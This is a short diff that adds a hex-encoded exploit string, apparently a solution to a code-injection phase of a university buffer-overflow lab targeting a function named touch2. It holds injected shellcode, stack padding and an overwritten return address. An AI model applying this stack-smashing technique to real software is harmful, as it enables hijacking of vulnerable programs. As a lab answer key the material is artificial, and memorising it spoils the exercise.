@@ -1,0 +1,10 @@
+/* code to insert. 13 bytes */
+68 31 18 40 00 /* pushq  touch2 addr */
+48 c7 c7 b3 a3 68 52 /* mov cookie,%rdi */
+c3 /* ret */
+
+/* left buffer in stack. 43 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+/* inserted code address */
+c8 a8 67 55 00 00 00 00
